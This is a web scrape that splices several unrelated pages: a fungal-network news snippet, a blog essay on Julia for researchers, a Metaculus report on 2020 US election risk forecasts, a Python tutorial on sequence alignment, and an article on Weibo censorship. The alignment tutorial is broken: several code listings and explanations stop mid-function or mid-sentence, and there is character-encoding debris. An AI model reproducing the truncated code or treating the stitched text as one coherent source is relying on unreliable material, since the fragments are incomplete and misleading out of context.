network.</p><p>“Knowing whether fungal networks are operating the same way in other tree species could factor into how we reforest areas after harvesting them, and it could inform how we want to plant trees to preserve these networks.”</p><p>The research was supported by the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nserc-crsng.gc.ca%2Findex_eng.asp&amp;t=Yzg5OTI3YWU0M2NiYmZlYmIxNWM3YTFmN2IwNTE1Mzk1NTk5OTI5NixpR0xueFpVNQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F632982799643705344%2Fsoil-fungi-support-trees&amp;m=0&amp;ts=1603946212">Natural Sciences and Engineering Research Council of Canada</a>.</p><p>–</p><p><b>Source: <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.folio.ca%2Fsoil-fungi-act-like-a-support-network-for-trees-study-shows%2F&amp;t=NjgxMTc4MGEzOGFhZGMxOWQ2OWQzYWU3YzUyMGIyMTQ1YzQ3ZTAxMSxpR0xueFpVNQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F632982799643705344%2Fsoil-fungi-support-trees&amp;m=0&amp;ts=1603946212">University of Alberta</a></b></p><p>Full study:&nbsp;“Beyond seedlings: Ectomycorrhizal fungal networks and growth of mature <i>Pseudotsuga menziesii</i>&nbsp;“, <i>Journal of Ecology</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1111%2F1365-2745.13507&amp;t=MTZhMzY5ZjU2MmI1ZjAxY2MzMTExOTBhMTE0OGU1YTVlMzU2ZDZiYixpR0xueFpVNQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F632982799643705344%2Fsoil-fungi-support-trees&amp;m=0&amp;ts=1603946212">https://doi.org/10.1111/1365-2745.13507</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/615038337350303744/long-living-trees-tropical-forests">Long-living trees account for bulk of biomass, carbon storage in some tropical rainforests</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>You might have heard about Julia, the language often praised for the C-like performance it can attain while keeping a clean syntax reminiscent of Python. In this blog post, I want to share a different opinion why I like using Julia, which is only tangentially related to its pure performance. It is about the community Julia enables and how that could have a beneficial influence on the way scientific software is written.</p> <p>First off, I am not a trained computer scientist. Almost nobody in my research fields, psychology and neuroscience, is a trained computer scientist. But everybody needs to code nowadays to do research. Experiments are setup with code, data is analysed with code, graphs are made with code. So how does that work out if nobody is really trained for coding?</p> <p>It leads to a situation where people waste time and often produce inferior results because they don't really grasp the tools they are using. Code is often of low quality, neither version controlled, maintainable nor reproducible. Matlab, R and Python ecosystems offer tools that allow researchers to focus on their direct interest, the data, and spend less time fighting with the compilers and complicated syntax of C++ and Fortran. But this "convenience layer" contributes to a situation where people use tools without a deeper understanding what they are doing, without an idea of what to do when those tools are not enough. We have powerful packages with relatively user-friendly API's at our disposal in each dynamic language of choice. But the important and performant parts are written in C, C++ and Fortran, hidden from view.</p> <p>It is not easy to find out how things work under the hood in Python, R or Matlab. I think that this creates a big gap between users and creators of scientific tools.</p> <hr> <p>Students in a university R or Python data analysis course will probably learn a bit about loops and conditionals first, because that's just how everyone learning to code starts. But after that first phase, they will quickly move on to learning APIs of packages like dplyr, ggplot, pandas, because that's what's <em>actually used</em> by everybody. These API's tend to be quite removed from the basic building blocks of each language (like the common but non-standard <code>%&gt;%</code> syntax in R). If those tools don't offer something out of the ordinary as a pre-packaged functionality, the students are out of luck. They know that they shouldn't attempt to <em>write</em> any serious low-level analysis methods in R or Python directly, because that will probably be slow, and their tools of choice are also not made like that. One of the first things Python, R and Matlab novices learn is <em>"Vectorize everything! Don't write for-loops, they are slow!"</em>. How surprised would they be to find out that the inside of pandas, dplyr and co is full of for-loops, because they are indispensable building blocks in compiled languages?</p> <p>One such example of the boundaries of existing packages I've encountered in my previous work was when I analysed head movement data with Python's pandas library. I really wanted a column in my dataframe that had one rotation matrix per row, describing head orientation over time. But that was not possible to do effectively because a rotation matrix is just not a data type that pandas expects you to store in a column. At every corner my "weird" datatype caused problems with underlying assumptions of pandas, or numpy or matplotlib. In Julia, it would have been really easy to make a <code>Vector</code> with 3x3 matrices from <code>StaticArrays.jl</code>. <code>DataFrames.jl</code> doesn't care what your column vectors contain. To me, the point was not even to have the fastest solution, just to have a solution that cleanly expressed my intent.</p> <hr> <p>The two-language problem is often presented as an <em>inconvenience</em> to researchers because of its time cost. I think it is a bit more than that. True, it takes a lot of time to figure out a solution to a problem in a dynamic language and then transfer it faithfully to a compiled language, to write bug-free bindings and package everything up for reuse. Julia tries to solve that problem, and it does very well to bridge the gap between a glue language with simple syntax and a serious numerical powerhouse. Countless benchmarks can attest to its speed. But when we focus only at how much time it takes to use two languages, I think we overlook what kind of effect a language gap has on research communities in this age of code.</p> <p>The Julia community is filled with people from diverse scientific backgrounds. Many of them, like me, are not computer scientists. That doesn't stop them from being involved in writing serious low level packages. And if they are not writing packages themselves, they are often helping by filing issues and creating PRs, adding their own perspectives on design questions. They do this even for the Julia language itself, if they find bugs or API inconsistencies. When I was using Matlab, Python and R, I didn't see other researchers contribute to the fundamentals of their respective ecosystems in this way. In Julia, I see it all the time.</p> <p>This is possible, in my opinion, because there is a continuous path from surface-level glue code to close-to-the-metal high-performance code in Julia, which can be discovered almost playfully - usually driven by the desire to reduce the number of allocations or runtime of a small function. In Julia, novices can learn first principles in a beginner friendly way, without caring about types, writing code that looks basically like Python. These first principles don't lose their importance when <em>serious</em> packages are discovered. They instead become ever more powerful, the more knowledge a new user absorbs, because they can be combined in more and more flexible and innovative ways. As another example, if you use Stan from R, you have to feed it a script in a different language, while your <code>Turing.jl</code> models can be written in normal Julia. There's really no limit to what you can send through Bayesian inference this way. Additionally, advanced topics like metaprogramming and optimization are always only a few steps away, and interesting lessons about one's own code or the inner workings of Julia can be learned just by applying a couple of macros such as <code>@code_warntype</code> here and there. A transformation from beginner to expert code sometimes goes only through a couple minor changes like adding <code>@inbounds</code> in strategical places, or minimizing the use of allocations.</p> <p>For example, with <code>Revise.jl</code> and the <code>@edit</code> macro, it's quite simple to manipulate even Base functions on the fly, and play around with different implementations of Julia's fundamental building blocks. The multiple dispatch paradigm makes it possible to inject functionality deep into third party code and to connect one's homegrown implementations with the work of others in a way that I have never seen in Python, R or Matlab. This is not brittle tampering like, e.g., monkeypatching in Python, but allows you to meaningfully extend the available functionality if you want to. Packages are specifically written to be extensible by others, each dispatch presents an opportunity for third parties to hook into. One person might have a small idea, but through Julia's ability for composition, it can easily become part of something bigger (like the often cited Differential Equations + Measurements + Plot Recipe combo).</p> <hr> <p>I think Julia's gentle learning curve and raw processing power are an invitation to domain experts outside of computer science to help write the software their fields need. Personally, it makes me feel more powerful and self-sufficient to work in a dynamic language that can not only give access to other people's well written packages (written in Julia, but also R, Python and Matlab through <code>RCall.jl</code>, <code>PyCall.jl</code> and <code>MATLAB.jl</code>, respectively). It also allows me to write my own, and not just for toy problems but theoretically scalable even to supercomputers.</p> <p>I hope that in the future Julia loses the perception of being a niche language for numerics, which might discourage people who don't need just that from trying it. Instead, I would frame it as a powerful general programming language that offers something for everyone from beginners to experts and encourages collaboration and code reuse through its extensible multiple dispatch paradigm. If researchers write more algorithms in high-level Julia and not in low-level C++, this could make them more accessible for novices and easier to check for other researchers, because Julia shares the same "pseudo-code" qualities of Python (which doesn't actually look so clean anymore if everything is prefixed by <code>np.</code>). The Julia community also highly values CI and good test coverage and I hope that such things become more mainstream in the future, because every scientist that works with code can benefit from adopting these best practices.</p> <hr> <p>I wrote this post because I felt these aspects tend to be under-represented when Julia is discussed. Sometimes, the focus on micro-benchmarks and the resulting exaggerated or one-sided claims of superior performance expectedly cause users of other languages to go into defense mode. That's not necessary in my opinion. Yes, Python R and Matlab also have amazing fast packages that enable people to do great research. But these languages are also fundamentally limited in how low-level users can reach, and they don't allow for the same freedom to create beautiful and generic implementations that still harness all available computing power. They don't allow scientists to bridge the gap from user to creator quite as well. And bridging that gap holds a lot of potential, especially in today's world where everything is about code.</p>  </div></div>]]>

      <h2>
        Results of 2020 U.S. Election Risks Survey
        
      </h2>
      <p><small>
        By <a href="https://www.metaculus.com/accounts/profile/113129/">Juan</a> on <span local-datetime="2020-10-20T23:00:00+00:00">Oct. 20, 2020, 11 p.m. GMT</span>
        
      </small></p>
      <p>Metaculus and Rachel Aicher, Adjunct Lecturer in Political Science at Hunter College, City University of New York, are excited to announce the results of a forecasting session on risks to the 2020 U.S. election! We solicited probabilistic predictions about risks to the U.S. general election on 3 November 2020, including on issues relating to effective electoral administration, potential contestation of results, likelihood of civil unrest, and smoothness of any potential transition. We are building on the important work of others, including the <a href="https://paxsims.files.wordpress.com/2020/08/preventing-a-disrupted-presidential-election-and-transition-8-3-20.pdf">Transition Integrity Project</a> and <a href="https://lawecommons.luc.edu/cgi/viewcontent.cgi?article=2719&amp;context=luclj">Edward Foley</a>, who have also made the case that a landslide or otherwise decisive victory for either candidate would minimize the probabilities of such risks. Our aim is for relevant election security decision makers and the general public to be able to make informed choices on the basis of these probability estimates and, if needed, to make necessary preparations.</p>
<p>Below we have included a summary of our results, our methodology, and our analysis. For more, please see our <a href="https://drive.google.com/file/d/1CbkMoNE7eftNwHl5yC71MDmeXJTvzfk9/view?usp=sharing">full report</a>.</p>
<h4> Summary of Results </h4>

<p><b>Voter intimidation and challenges</b>: Experts’ median prediction for the number of voter intimidation/challenge calls that will be made through the Election Protection nonpartisan voter protection national hotline is 8.4k (80% CI: 1.5k - 18.3k). The number of such calls made during the 2016 election was approximately 4.7k. Experts assigned a 5% probability to over 20k calls being placed, which would be more than four times the number of calls made in 2016.</p>
<p><b>Presidential election result known</b>: Experts predicted a median of 8 November 2020 (80% CI: 3 November 2020 - 13 January 2021) for when the presidential election result will be called by the Associated Press.</p>
<p><b>Concession by losing candidate</b>: Experts assigned a median of 40% to the probability of President Trump conceding if the election is called by the Associated Press in favor of Democratic nominee Biden. They assigned a median 95% chance to Democratic nominee Biden conceding if the election is called by the Associated Press in favor of President Trump.</p>
<p><b>Domestic election interference</b>: Experts’ median prediction for President Trump ordering an agency or personnel under his authority to directly interfere in the vote counting process and for these orders to be successfully carried out is 10%.</p>
<p><b>Resolution by state legislature or Supreme Court</b>: Experts assigned a median of 7% to the probability of at least one state legislature appointing its own slate of electors instead of assigning electors in strict accordance with ballots cast by their state’s voters. Experts’ median prediction for the Supreme Court issuing a decision that determines the result of the election is 19%.</p>
<p><b>Election-related violence and unrest</b>: Experts predicted a median of 60 deaths (80% CI: 0 - 912) occurring due to election-related violence between 20 October 2020 and 20 January 2021. Experts assigned an 8% probability to over 1,000 deaths. Experts’ median prediction for President Trump invoking the Insurrection Act between 3 November 2020 and 20 January 2021 is 10%.</p>
<p><b>Confusion as to who will be the next president on Inauguration Day</b>: Experts assigned a 2% probability to it being unclear who is exercising the powers of the presidency after 12PM EST on 20 January 2021.</p>
<h4> Methodology and Logistics </h4>

<p>From 8 October to 15 October 2020, predictions were made for 10 questions related to risks to the 2020 U.S. election.</p>
<p>Two groups of experts were asked to participate: (i) subject matter experts (SMEs) and (ii) trained forecasters (TFs). SMEs were defined as political scientists with expertise in American government and electoral systems. They have several years of experience in political science research and have been closely following developments in the lead up to the U.S. general election on 3 November 2020. TFs were defined as the top 1% out of a total pool of approximately 13,000 forecasters here on Metaculus!</p>
<p>A total of 17 experts (8 subject matter experts and 9 trained forecasters) participated and submitted 220 predictions for aggregation into a consensus distribution. During the entire forecasting session, experts could submit multiple predictions for the same question and collaborate via a comment section underneath each question. Experts made 31 comments, sharing analyses and insights with one another across all questions.</p>
<h4> Analysis and Implications </h4>

<p>A key challenge for policy makers and risk analysts is to identify not only which scenarios are possible, but also which are probable and consequential enough to merit significant attention and resources for planning and mitigation. To this end, this forecasting study aims to map out the landscape of different risks related to the upcoming U.S. presidential election. This research brings together multiple experts’ perspectives to offer timely analysis and insight into election processes, transition issues, and public safety risks highlighted by prior studies and scenario planning. Experts were nearly certain that it will be clear who is president by Inauguration Day (only a median 2% chance otherwise), but were less confident in predicting exactly when the results will be called and noted significant probabilities of vote count interference, violence, and civil unrest. We take a closer look at some of these scenarios below.</p>
<p>Results indicate that experts anticipate higher levels of voter intimidation and challenge complaints than in the previous general election. The median prediction for the number of voter intimidation or challenge calls that will be made through the National Election protection hotline was 8,400 — roughly double the calls made during the <a href="https://lawyerscommittee.org/wp-content/uploads/2017/06/Anuual-report-2016.pdf">2016 election</a>. It is likely the voting process will be more fraught than usual.</p>
<p>Although the median prediction for when the presidential election result will be called was 8 November 2020, the wide 80% confidence interval ranging from 3 November 2020 to 13 January 2021 reflects a high degree of uncertainty, with some participants commenting that they anticipate delays due to mail-in ballots and vote counting issues.</p>
<p>Experts had divergent expectations of the two candidates’ likelihood of giving a concession speech if the election is called for their opponent: 95% for Biden, yet only 40% for Trump. This suggests a smoother transition if the election is called for Trump, as Biden is highly likely to concede, but a more contested and acrimonious transition if the election is called for Biden, since Trump will probably not offer a traditional and timely concession.</p>
<p>Results indicate it is unlikely authorities under the President’s remit will interfere in the vote counting process, although the experts’ median prediction of 10% likelihood for this scenario still gives cause for concern.</p>
<p>There has been much public conjecture as to how delayed ballot counting and contested results might be ultimately resolved, and results of this expert survey suggest a nearly 1 in 5 chance the Supreme Court will play a decisive role in the election outcome. Participants found it less likely (median 7% probability) that state legislatures will depart from established processes for assigning electors, however.</p>
<p>While large-scale violence and military intervention to quell civil unrest seem unlikely, experts still judged these possibilities to be far from remote. Experts predicted a median of 60 deaths occurring due to election-related violence, with an 80% confidence interval of 0 to 912 fatalities that reflects a high degree of uncertainty. Still, the real possibility of violence is a notable departure from the peaceful transitions that have been the hallmark of past U.S. elections. Results indicate an 8% probability of over 1,000 election-related deaths — suggesting that while widespread sustained clashes are unlikely, this possibility warrants real concern. Experts assigned a 10% median prediction that President Trump will invoke the Insurrection Act to mobilize troops during the transition period.</p>
<p>Overall, expert predictions indicate a non-trivial risk of vote count interference, contested results, and election-related violence — potentially departing from the established norms of concession and the peaceful transition of executive power that have characterized past U.S. elections. With expert predictions indicating the incumbent will likely refuse to concede if the election is not called in his favor and a nearly one-in-five probability the Supreme Court will play a decisive role in determining the election outcome, policy makers would do well to take these issues seriously.</p>

</a></p><p>By John Lekberg on October 25, 2020.
</p><hr>
<p>This week's post is about solving the "Sequence Alignment" problem. You will learn:</p>
<ul>
<li>How to create a <a href="https://en.wikipedia.org/wiki/Brute-force_search">brute force solution</a>.</li>
<li>How to create a more efficient solution using the <a href="https://en.wikipedia.org/wiki/Needleman%E2%80%93Wunsch_algorithm">Needleman-Wunsch algorithm</a> and <a href="https://en.wikipedia.org/wiki/Dynamic_programming">dynamic programming</a> .</li>
</ul>

<p>As input, you are given two <strong>sequences.</strong> E.g.</p>
<pre><code>"CAT"
"CT"
</code></pre>
<p>(The sequences can be <a href="https://en.wikipedia.org/wiki/String_(computer_science)">strings</a> or other <a href="https://en.wikipedia.org/wiki/Array_data_type">arrays</a> of data.)</p>
<p>As output, your goal is to produce an <strong>alignment</strong>, which pairs up elements of the sequence. E.g.</p>
<pre><code>C - C
A - T
T - 
</code></pre>
<p>An alignment can have gaps. E.g.</p>
<pre><code>C - C
A -
T - T
</code></pre>
<p>While an alignment can have gaps, it cannot change the relative order of the
sequence elements. E.g. "CT" cannot be changed into "TC".</p>
<p>Specifically, your goal is to produce an alignment with <strong>maximal score.</strong>
Here's how to calculate the score:</p>
<ul>
<li>Score = 0</li>
<li>Look at each pair of elements:
<ul>
<li>If there is a gap, then score -= 1</li>
<li>Otherwise, if the elements are the same, then score += 1.</li>
<li>Otherwise, if the elements are different, then score -= 1.</li>
</ul>
</li>
</ul>
<p>E.g. this alignment has a score of -1:</p>
<pre><code>C - C   (same, +1)
A - T   (different, -1)
T -     (gap, -1)
</code></pre>
<p>But this alignment has a score of +1:</p>
<pre><code>C - C   (same, +1)
A -     (gap, -1)
T - T   (same, +1)
</code></pre>
<p>So, your goal is to take two <strong>sequences</strong> and find an <strong>alignment</strong> with <strong>maximal score.</strong></p>

<p>For the input, I represent the <strong>sequences</strong> as <a href="https://docs.python.org/3/library/stdtypes.html#text-sequence-type-str">strings</a> or
<a href="https://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range">lists</a>.
E.g. I can represent the sequence "CAT" as</p>
<pre><code>"CAT"
</code></pre>
<p>or as</p>
<pre><code>["C", "A", "T"]
</code></pre>
<p>Really, anything that implements <a href="https://docs.python.org/3/library/collections.abc.html#collections.abc.Sequence">collections.abc.Sequence</a> (not just
<a href="https://docs.python.org/3/library/stdtypes.html#text-sequence-type-str">strings</a> and <a href="https://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range">lists</a>) will work.</p>
<p>For the output, I represent an <strong>alignment</strong> as a <a href="https://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range">list</a> of
<a href="https://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range">tuples</a> of indices (or <a href="https://docs.python.org/3/library/constants.html#None">None</a>, if there is a gap.)
E.g. this alignment:</p>
<pre><code>C - C
A - T
T -
</code></pre>
<p>would be represented as</p>
<pre><code>[(0, 0), (1, 1), (2, None)]
</code></pre>
<p>And this alignment:</p>
<pre><code>C - C
A -
T - T
</code></pre>
<p>would be represented as</p>
<pre><code>[(0, 0), (1, None), (2, 1)]
</code></pre>

<p>I like starting with <a href="https://en.wikipedia.org/wiki/Brute-force_search">brute force solutions</a> when I work on problems.
Brute force solutions tend to be simpler to implement and, fairly often, the
brute force solution is "good enough" for the actual inputs that will be
encountered.</p>
<p>I start by creating a function that takes two index ranges and iterates over
all possible alignments:</p>
<pre><code>from collections import deque


def all_alignments(x, y):
    """Return an iterable of all alignments of two
    sequences.

    x, y -- Sequences.
    """

    def F(x, y):
        """A helper function that recursively builds the
        alignments.

        x, y -- Sequence indices for the original x and y.
        """
        if len(x) == 0 and len(y) == 0:
            yield deque()

        scenarios = []
        if len(x) &gt; 0 and len(y) &gt; 0:
            scenarios.append((x[0], x[1:], y[0], y[1:]))
        if len(x) &gt; 0:
            scenarios.append((x[0], x[1:], None, y))
        if len(y) &gt; 0:
            scenarios.append((None, x, y[0], y[1:]))

        # NOTE: "xh" and "xt" stand for "x-head" and "x-tail",
        # with "head" being the front of the sequence, and
        # "tail" being the rest of the sequence. Similarly for
        # "yh" and "yt".
        for xh, xt, yh, yt in scenarios:
            for alignment in F(xt, yt):
                alignment.appendleft((xh, yh))
                yield alignment

    alignments = F(range(len(x)), range(len(y)))
    return map(list, alignments)
</code></pre>
<p>(This code uses: <a href="https://docs.python.org/3/library/collections.html#collections.deque">collections.deque</a>, <a href="https://docs.python.org/3/glossary.html#term-generator">generator function</a>,
<a href="https://docs.python.org/3/library/functions.html#func-range">range</a>, <a href="https://docs.python.org/3/library/functions.html#len">len</a>, <a href="https://docs.python.org/3/library/functions.html#map">map</a>.)</p>
<p>E.g. here are all possible alignments of "CAT" and "CT":</p>
<blockquote>
<pre><code>list(all_alignments("CAT", "CT"))

<p>Next, I create a function that takes two sequences and an alignment to produce a score:</p>
<pre><code>def alignment_score(x, y, alignment):
    """Score an alignment.

    x, y -- sequences.
    alignment -- an alignment of x and y.
    """
    score_gap = -1
    score_same = +1
    score_different = -1

    score = 0
    for i, j in alignment:
        if (i is None) or (j is None):
            score += score_gap
        elif x[i] == y[j]:
            score += score_same
        elif x[i] != y[j]:
            score += score_different

    return score
</code></pre>
<p>Consider this alignment:</p>
<pre><code>C - C
A -
T - T
</code></pre>
<p>Here's an example of computing the score:</p>
<blockquote>
<pre><code>x = "CAT"
y = "CT"
alignment = [(0, 0), (1, None), (2, 1)]
alignment_score(x, y, alignment)

<p>With these two functions -- <code>all_alignments</code> and <code>alignment_score</code> -- the
<a href="https://en.wikipedia.org/wiki/Brute-force_search">brute force solution</a> will search all alignments to find one with
a maximal score:</p>
<pre><code>from functools import partial


def align_bf(x, y):
    """Align two sequences, maximizing the

<p>What's the <a href="https://en.wikipedia.org/wiki/Time_complexity">time complexity</a> of this solution? For two sequences of <var>n</var> and <var>m</var> elements:</p>
<ul>
<li>
<p>The number of possible alignments is given by the <a href="https://en.wikipedia.org/wiki/Delannoy_number">Delannoy numbers</a>. The number of alignments <var>D</var> is given by the <a href="https://en.wikipedia.org/wiki/Recurrence_relation">recurrence

</blockquote>
<p>To give you a sense of how quickly this number grows:</p>
<pre><code>from functools import lru_cache


@lru_cache(maxsize=None)
def D(n, m):
    if n == 0 or m == 0:

<ul>
<li>
<p>There are 3 possible alignments of two 1-element sequences:</p>
<blockquote>
<pre><code>D(1, 1)

<p><var>D</var>(100,100) is getting close the the <a href="https://en.wikipedia.org/wiki/Eddington_number">Eddington number</a>, 10e+80 --

<p>(See <a href="https://oeis.org/A001850">OEIS A001850</a> for more information on <a href="https://en.wikipedia.org/wiki/Delannoy_number">Delannoy numbers</a> of the form <var>D</var>(<var>n</var>,<var>n</var>).)</p>
</li>
<li>
<p>Computing the alignment score takes time <a href="https://en.wikipedia.org/wiki/Time_complexity#Linear_time">linear</a> in the sizes of both sequences: <a href="https://en.wikipedia.org/wiki/Big_O_notation">O</a>(<var>n</var>Â&nbsp;+Â&nbsp;<var>m</var>).</p>
</li>
</ul>
<p>As a result, the overall time complexity of the brute force solution is:</p>
<blockquote>
<p>O( <a href="https://en.wikipedia.org/wiki/Delannoy_number"><var>D</var>(<var>n</var>, <var>m</var>)</a> Ã— (<var>n</var> + <var>m</var>) )</p>
</blockquote>

<p>The brute force solution is simple, but it doesn't scale well.
In practice, sequence alignment is used to analyze sequences of biological data (e.g. <a href="https://en.wikipedia.org/wiki/Nucleic_acid_sequence">nucleic acid sequences</a>).
Given that the size of these sequences can be hundreds or thousands of elements
long, there's no way that the brute force solution would work for data of that
size.</p>
<p>In 1970, Saul B. Needleman and Christian D. Wunsch created a faster algorithm
to solve this problem: the <a href="https://en.wikipedia.org/wiki/Needleman%E2%80%93Wunsch_algorithm">Needleman-Wunsch algorithm</a>.
(See <a href="https://www.sciencedirect.com/science/article/abs/pii/0022283670900574">"A general method applicable to the search for similarities in the amino acid sequence of two proteins"</a>, <a href="https://doi.org/10.1016/0022-2836(70)90057-4">https://doi.org/10.1016/0022-2836(70)90057-4</a>.)
The algorithm uses <a href="https://en.wikipedia.org/wiki/Dynamic_programming">dynamic programming</a> to solve the sequence alignment problem in O(<var>m</var><var>n</var>) time.</p>
<p>Here's a Python implementation of the Needleman-Wunsch algorithm, based on section 3 of <a href="https://upload.wikimedia.org/wikipedia/en/c/c4/ParallelNeedlemanAlgorithm.pdf">"Parallel Needleman-Wunsch Algorithm for Grid"</a>:</p>

<p>Chow Po-chung<strong>’</strong>s sixth Weibo account was killed on August 11, one day after he posted a photo of Hong Kong’s Lion Rock with the caption: “Hong Kong, my home.”</p>



<p>Chow, a political philosophy professor at the Chinese University of Hong Kong, had anticipated this. A few weeks earlier, China had enacted a broad and vaguely worded <a href="https://www.nytimes.com/2020/06/30/world/asia/hong-kong-security-law-explain.html">national security law</a> in Hong Kong, which criminalizes pro-independence sentiments, and anything else that authorities interpret as “splittist” or damaging to China’s sovereignty.&nbsp;</p>



<p>Lion Rock, a mountain overlooking central Hong Kong, has become a symbol of the city’s pro-democracy movement. Within hours of Chow’s post, the comment section beneath it was flooded with nationalistic comments and personal attacks. He estimated hundreds of users reported him to Weibo for “trying to divide China,” and his account was deleted.</p>



<p>Nearly 550 million people — <a href="http://www.xinhuanet.com/politics/2020-04/28/c_1125915967.htm">more than 60% of China’s internet</a> users — have an account on Weibo, a microblogging platform owned by the Beijing-based Sina Corporation. Since its launch in 2009, the platform evolved into a rare space for public discussion in China, crucial for disseminating information, shaping political discussion, and generating grassroots campaigns, until heavy censorship kicked in two years later.</p>



<p>Chow opened his first account in 2011. He shared the joy of becoming a new father, photos with students, his teaching notes, his essays, and his experience partaking in social movements. He also facilitated and participated in ideological and philosophical debates with young Weibo users. He amassed 180,000 followers before being censored in June 2018. Five of his accounts have since been deleted, some due to posts about the protests, others for no obvious reason.&nbsp;</p>



<p>“I considered every message I posted as my last one,” Chow says.&nbsp;</p>



<p>While Weibo has always censored accounts, as Chinese authorities have stepped up their crackdown on freedom of speech and tightened their grip over all aspects of Chinese life in recent years, political discussions on the platform have become even more muted. Due to pervasive censorship and self-censorship, conversations on Weibo are even more cautious. <em>Zhahao</em>, or “account bombing,” where accounts voicing dissenting opinions get censored, have become more common. Ultranationalistic and chauvinist narratives now drown out critical posts, making it harder for users to speak their minds.</p>



<hr>



<p>Chinese authorities give social media platforms general guidance about what topics and users to monitor or censor, leaving Weibo to decide which keywords and accounts to block.&nbsp;</p>



<p>Even if regulators have their eyes on a specific message or account, they still need the service provider to actually delete the content, according to Fu King-wa, a journalism professor at The University of Hong Kong. State censorship began to intensify in 2011, when social media debates on controversial environmental, social, and cultural issues started to spill over to offline grassroots protests and campaigns, Fu says. This included dozens of ordinary people challenging China’s election system by campaigning as independent candidates on Weibo, and users addressing the controversy around the Red Cross Society of China, which erupted after a young senior official at the government-run charity posted photos on Weibo of her lavish lifestyle.&nbsp;</p>



<p>Fu says it’s not clear if censorship has stepped up again in recent years, as he doesn’t have figures to compare early censorship to what’s happening now, but he suggests that years of censorship have intimidated users into silence.&nbsp;</p>



<p>According to the <a href="https://weiboscope.jmsc.hku.hk/">Weiboscope</a> tracker, which Fu runs at Hong Kong University, nearly 2% of 54,490 random user accounts tracked in 2015 no longer existed by 2020. Fu believes most of the lost accounts were deleted by Weibo. This is a rough estimate, as some accounts may have been reactivated since they were deleted, or deleted by users.</p>



<p>“By the end of 2019, the discussion on Weibo was really dominated by discourse and narratives created by state media,” Fu says. “Finding alternative discussion on issues like the Hong Kong protest was very difficult, unless you followed the less popular accounts.”</p>

<p>A more alarming trend, Fu says, is that nationalistic users are now mobilizing hundreds or thousands of people to report on people with political views they oppose and thus pressure Weibo to “kill” their accounts. According to Chow, this tactic is reminiscent of Cultural Revolution–style purging of political rivals. When enough people report on the same account, there is little doubt that censors will delete it.&nbsp;</p>



<p>Shutting down accounts intimidates users into self-censorship. Weibo still serves as a critical venue for public discussion: 2020 has brought an increasing usage of the site, Fu notes, because more Chinese took to Weibo to voice their grievances, frustration, and discontent amid the outbreak of Covid-19 in Wuhan. But when users fear they will lose their accounts, they no longer speak as freely.</p>



<p>Weibo users who spoke to <em>Rest of World</em> all noticed a trend of increasing censorship over the past few years. Accounts have been removed after mentioning politically sensitive topics, such as the protests in Hong Kong, China’s human rights violations against Uighurs in Xinjiang, Covid-19, and top political leaders.&nbsp;</p>



<p>When she became active on Weibo in early 2018, Lao Yang, whose nickname is roughly translated as “Old Yang,” fiercely advocated for gender equality and human rights to her 50,000 followers. “I enjoyed just shifting the conversation a little bit more toward the uncomfortable. I enjoyed being the asshole in the room,” Yang says.</p>



<p>Her account was deleted last summer after she signaled support for the Hong Kong protests. When she started a new account, a self-proclaimed Weibo staff member reached out and advised her to lay low for a while as she’d already popped onto the radar of the Cyberspace Administration, China’s central internet censor. They told her that whenever she posted sensitive words, primarily in relation to Hong Kong, authorities at the Cyberspace Administration received an algorithmic notice.&nbsp;</p>



<p>“As long as you keep your account,” reads a message from the Weibo worker that was reviewed by <em>Rest of World</em>, “you can keep your advocacy going.”</p>



<p>Yang followed the advice. She went back to advocacy after a few months, but her account was finally “bombed” on New Year’s Day. Whenever she tries to start a new one, it is deleted within 24 hours. And mainland Weibo users can face severe consequences beyond censorship. If their real identity is revealed, nationalist Weibo users may report them to their employers.&nbsp;</p>



<p>In 2013, China instituted a <a href="http://cpc.people.com.cn/n/2013/0910/c87228-22871736.html">law</a> stating that, if one user’s post is considered defamatory and is viewed 5,000 times or reposted more than 500 times, the original poster can face a jail sentence.</p>



<p>Zhahao<em> </em>attacks can also be very disturbing for their victims. “The first bombing dealt a big blow to me,” Chow says. “This was an attack on your life, your memory, your social network, and your identity as a whole.”</p>

<p>Weibo has <a href="http://www.xinhuanet.com//2017-09/14/c_1121665443.htm">required</a> real-name verification upon registration since 2017, linking accounts to people’s official ID or phone number. But users who have been kicked off have been able to get back on using burner accounts from underground online shops.</p>



<p>It’s unclear how such shops set up bot accounts — none of those contacted would talk with a journalist. The cost of a burner account ranges from 0.5 yuan (7 cents) to 240 yuan ($35). The account sellers operate in a legal gray zone, catering mainly to accounts looking to boost their profiles. Authorities have been cracking down on such shops in recent years. In 2018, China’s central internet regulator <a href="https://www.thepaper.cn/newsDetail_forward_2645705">launched a campaign</a> to remove users who obtained burner accounts after being banned on social media platforms.</p>



<p>Wu Xianwei turned to buying burners after her first two accounts were removed. Wu, who grew up in Shanghai but is a Canadian citizen, recently completed her Ph.D. in communications at the University of Iowa. Her first account was censored in March 2018, after China scrapped presidential term limits, allowing current president Xi Jinping to remain in power indefinitely. Wu reposted a statement that read: “I disagree.” The following day, all the accounts that she knew reposted it had disappeared.</p>



<p>Her spare account, also listed under a pseudonym, was active for only two months until she shared a satirical picture mocking Xi and Kim Jong Un.&nbsp;</p>



<p>Wu bought 20 burner accounts for 10 yuan ($1.50) in 2018 and went through every single one of them within a year. Since then, getting ahold of burners has become more difficult. When Wu went back to the same shop for more last year, she found that it no longer existed. Many others have also shut down.&nbsp;</p>



<p>In 2019, Wu says, about 100 of her Weibo friends also lost their accounts. Most of them were highly educated liberals, and they formed a WeChat group to stay in touch. That group, too, has been deleted and re-created.&nbsp;</p>



<p>Still, Wu has been galvanized by the experience. She keeps reappearing on Weibo just to “piss off” ultranationalistic users.&nbsp;</p>



